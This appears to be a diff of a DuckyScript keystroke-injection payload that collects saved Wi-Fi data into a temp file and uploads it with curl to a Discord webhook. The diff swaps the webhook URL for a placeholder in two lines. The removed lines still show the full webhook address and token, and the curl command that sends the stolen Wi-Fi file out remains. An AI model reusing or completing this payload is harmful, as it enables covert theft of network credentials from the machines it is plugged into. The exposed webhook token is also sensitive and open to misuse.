@@ -6,7 +6,7 @@ DELAY 300
 
 ENTER
 DELAY 550
-STRING SET w=https://discord.com/api/webhooks/1063949566031958068/vadCokbT1wlyfJz6DKJaVJA0Z7WZROQIatWhBKq1lqXMtmGph0l8_DBakShjdjypgtV8
+STRING SET w=a
 DELAY 50
 ENTER
 
@@ -54,7 +54,7 @@ DELAY 100
 ENTER
 DELAY 5500
 
-STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" https://discord.com/api/webhooks/1063949566031958068/vadCokbT1wlyfJz6DKJaVJA0Z7WZROQIatWhBKq1lqXMtmGph0l8_DBakShjdjypgtV8
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" a
 ENTER
 DELAY 1000
 
